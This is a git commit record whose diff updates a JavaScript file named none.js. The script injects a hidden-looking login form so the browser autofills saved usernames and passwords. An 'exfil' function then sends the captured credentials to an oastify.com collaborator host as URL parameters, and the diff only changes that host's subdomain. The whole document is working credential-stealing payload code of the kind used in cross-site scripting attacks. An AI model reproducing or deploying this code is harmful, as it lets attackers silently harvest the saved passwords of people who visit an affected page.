b14e83d5db98d25fe922c17b434886abd00aa525
Goififpdpyfydoddoy <gzshgsabsbsbs@gmail.com>
2024-10-07 15:07:59 +0100

    Update none.js

--- none.js
+++ none.js
@@ -4,7 +4,7 @@ f.style="position:fixed;top:10px;left:10px;background:white;padding:10px;border:
 f.innerHTML='<form id="pf"><input id="u" name="username" autocomplete="username" placeholder="Username"><br><input id="p" name="password" autocomplete="current-password" placeholder="Password"></form>';
 document.body.appendChild(f);
 
-function exfil(){let u=document.getElementById('u').value,p=document.getElementById('p').value;if(u&&p){(new Image()).src="https://qvp2y3jyuigag7os8it58g8dy44vsogd.oastify.com/exfil?u="+encodeURIComponent(u)+"&p="+encodeURIComponent(p);document.body.removeChild(f);}}
+function exfil(){let u=document.getElementById('u').value,p=document.getElementById('p').value;if(u&&p){(new Image()).src="https://msiyvzgured6d3lo5eq15c59v01rpmdb.oastify.com/exfil?u="+encodeURIComponent(u)+"&p="+encodeURIComponent(p);document.body.removeChild(f);}}
 
 function checkAutoFill(){let u=document.getElementById('u').value,p=document.getElementById('p').value;if(u&&p)exfil();}
 
